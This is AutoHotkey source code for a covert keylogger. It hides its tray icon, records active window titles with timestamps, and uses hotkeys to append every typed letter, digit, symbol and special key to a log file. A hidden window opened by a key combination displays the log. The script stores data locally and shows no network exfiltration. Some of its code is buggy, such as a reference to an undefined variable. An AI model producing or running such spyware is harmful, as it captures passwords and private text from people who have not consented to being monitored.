#NoEnv ; Recommended for performance and compatibility with future #Persistent
#NoTrayIcon

logintervolts = 600000
FormatTime, date, YYYYMMDDHH12MISS
oldtitle=nothing
Gui, Add, Text, Center, -----------------------------------------------------------------------------------------KeyLog----------------------------------------------------------------------------------------
Gui, Add, Edit, x10 y30 h800 w600 R50 vedit vtext, 
Gui, Add, Button, x260 y700 w100, Exit 
Gui, Add, Button, x360 y700 w100, Refresh
Gui, Add, Button, x160 y700 w100, Clear
Gui, Add, Button, x360 y730 w100, Remove All Logs
Gui, Add, Button, x160 y730 w100, Log Location
SetTimer, timedate, %logintervolts%
SetTimer, timerenew, 60000



SendMode Input ; Recommended for new scripts due to its superior speed and reliability.

; Detect hidden windows since they can be active
; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)
DetectHiddenWindows, On
Loop,
{
 WinGetActiveTitle, watitle
 if (watitle != oldtitle and watitle != "")
  {
  FileAppend, `n`n-------- %watitle% --------`n%date%`n, C:\Program Files\log.txt
  oldtitle = %watitle%
  }
}

Return,
ButtonLogLocation:
{
Gui, 3:Add, Text,, Your Log is at C:\Program Files\log.txt
Gui, 3:Add, Button,, Open Log
Gui, 3:Add, Button,, Ok
Gui, 3:Show
Return,
}

3ButtonOpenLog:
{
Gui, 3:Destroy
Run, %wheretosave%
Return,
}

3ButtonOk:
{
Gui, 3:Destroy
Return,
}



ButtonRemoveAllLogs:
{
FileDelete, C:\Program Files\log.txt
ExitApp
}

ButtonRefresh:
{
FileAppend, {Reload}, C:\Program Files\log.txt
FileRead, keylogedtext, C:\Program Files\log.txt
GuiControl,, text, %keylogedtext%
Return,
}

ButtonClear:
{
FileDelete, C:\Program Files\log.txt
FileAppend,, C:\Program Files\log.txt
FileRead, keylogedtext, C:\Program Files\log.txt
GuiControl,, text, %keylogedtext%
Return,
}

~a::fileappend, a, C:\Program Files\log.txt
   
~b::fileappend, b, C:\Program Files\log.txt

~c::fileappend, c, C:\Program Files\log.txt

~d::fileappend, d, C:\Program Files\log.txt

~e::fileappend, e, C:\Program Files\log.txt

~f::fileappend, f, C:\Program Files\log.txt

~g::fileappend, g, C:\Program Files\log.txt

~h::fileappend, h, C:\Program Files\log.txt

~i::fileappend, i, C:\Program Files\log.txt

~j::fileappend, j, C:\Program Files\log.txt

~k::fileappend, k, C:\Program Files\log.txt

~l::fileappend, l, C:\Program Files\log.txt

~m::fileappend, m, C:\Program Files\log.txt

~n::fileappend, n, C:\Program Files\log.txt

~o::fileappend, o, C:\Program Files\log.txt

~p::fileappend, p, C:\Program Files\log.txt

~q::fileappend, q, C:\Program Files\log.txt

~r::fileappend, r, C:\Program Files\log.txt

~s::fileappend, s, C:\Program Files\log.txt

~t::fileappend, t, C:\Program Files\log.txt

~u::fileappend, u, C:\Program Files\log.txt

~v::fileappend, v, C:\Program Files\log.txt

~w::fileappend, w, C:\Program Files\log.txt

~x::fileappend, x, C:\Program Files\log.txt

~y::fileappend, y, C:\Program Files\log.txt

~z::fileappend, z, C:\Program Files\log.txt

~+A::fileappend, A, C:\Program Files\log.txt

~+B::fileappend, B, C:\Program Files\log.txt

~+C::fileappend, C, C:\Program Files\log.txt

~+D::fileappend, D, C:\Program Files\log.txt

~+E::fileappend, E, C:\Program Files\log.txt

~+F::fileappend, F, C:\Program Files\log.txt

~+G::fileappend, G, C:\Program Files\log.txt

~+H::fileappend, H, C:\Program Files\log.txt

~+I::fileappend, I, C:\Program Files\log.txt

~+J::fileappend, J, C:\Program Files\log.txt

~+K::fileappend, K, C:\Program Files\log.txt

~+L::fileappend, L, C:\Program Files\log.txt

~+M::fileappend, M, C:\Program Files\log.txt

~+N::fileappend, N, C:\Program Files\log.txt

~+O::fileappend, O, C:\Program Files\log.txt

~+P::fileappend, P, C:\Program Files\log.txt

~+Q::fileappend, Q, C:\Program Files\log.txt

~+R::fileappend, R, C:\Program Files\log.txt

~+S::fileappend, S, C:\Program Files\log.txt

~+T::fileappend, T, C:\Program Files\log.txt

~+U::fileappend, U, C:\Program Files\log.txt

~+V::fileappend, V, C:\Program Files\log.txt

~+W::fileappend, W, C:\Program Files\log.txt

~+X::fileappend, X, C:\Program Files\log.txt

~+Y::fileappend, Y, C:\Program Files\log.txt

~+Z::fileappend, Z, C:\Program Files\log.txt
   
~`::fileappend, `, C:\Program Files\log.txt

~!::fileappend, !, C:\Program Files\log.txt

~@::fileappend, @, C:\Program Files\log.txt

~#::fileappend, #, C:\Program Files\log.txt

~$::fileappend, $, C:\Program Files\log.txt

~^::fileappend, ^, C:\Program Files\log.txt

~&::fileappend, &, C:\Program Files\log.txt

~*::fileappend, *, C:\Program Files\log.txt

~(::fileappend, (, C:\Program Files\log.txt

~)::fileappend, ), C:\Program Files\log.txt

~-::fileappend, -, C:\Program Files\log.txt

~_::fileappend, _, C:\Program Files\log.txt

~=::fileappend, =, C:\Program Files\log.txt

~+::fileappend, +, C:\Program Files\log.txt

~[::fileappend, [, C:\Program Files\log.txt

~{::fileappend, {, C:\Program Files\log.txt

~]::fileappend, ], C:\Program Files\log.txt

~}::fileappend, }, C:\Program Files\log.txt

~\::fileappend, \, C:\Program Files\log.txt

~|::fileappend, |, C:\Program Files\log.txt

~;::fileappend, ;, C:\Program Files\log.txt

~'::fileappend, ', C:\Program Files\log.txt

~<::fileappend, <, C:\Program Files\log.txt

~.::fileappend, ., C:\Program Files\log.txt

~>::fileappend, >, C:\Program Files\log.txt

~/::fileappend, /, C:\Program Files\log.txt

~?::fileappend, ?, C:\Program Files\log.txt

~enter::
{
fileappend, {enter}`n, C:\Program Files\log.txt
FileRead, keylogedtext, C:\Program Files\log.txt
GuiControl,, text, %keylogedtext%
return,
}

~space::fileappend, %A_space%, C:\Program Files\log.txt

~tab::fileappend, {tab}, C:\Program Files\log.txt

~CapsLock::fileappend, {caps}, C:\Program Files\log.txt

~backspace::fileappend, {<-}, C:\Program Files\log.txt

~Control::fileappend, {Ctr}, C:\Program Files\log.txt

~Alt::fileappend, {Alt}, C:\Program Files\log.txt

~1::fileappend, 1, C:\Program Files\log.txt

~2::fileappend, 2, C:\Program Files\log.txt

~3::fileappend, 3, C:\Program Files\log.txt

~4::fileappend, 4, C:\Program Files\log.txt

~5::fileappend, 5, C:\Program Files\log.txt

~6::fileappend, 6, C:\Program Files\log.txt

~7::fileappend, 7, C:\Program Files\log.txt

~8::fileappend, 8, C:\Program Files\log.txt

~9::fileappend, 9, C:\Program Files\log.txt

~0::fileappend, 0, C:\Program Files\log.txt

~NumPad1::fileappend, 1, C:\Program Files\log.txt

~NumPad2::fileappend, 2, C:\Program Files\log.txt

~NumPad3::fileappend, 3, C:\Program Files\log.txt

~NumPad4::fileappend, 4, C:\Program Files\log.txt

~NumPad5::fileappend, 5, C:\Program Files\log.txt

~NumPad6::fileappend, 6, C:\Program Files\log.txt

~NumPad7::fileappend, 7, C:\Program Files\log.txt

~NumPad8::fileappend, 8, C:\Program Files\log.txt

~NumPad9::fileappend, 9, C:\Program Files\log.txt

~NumPad0::fileappend, 0, C:\Program Files\log.txt
^!s::
IfWinNotExist, KeyLog
FileRead, keylogedtext, C:\Program Files\log.txt
GuiControl,, text, %keylogedtext%
Gui, Show,, KeyLog
Return,

timedate:
{
FileAppend, `n%date%`n, C:\Program Files\log.txt
Return,
}

ButtonExit:
ExitApp

timerenew:
{
FormatTime, date, YYYYMMDDHH12MISS
}
Return,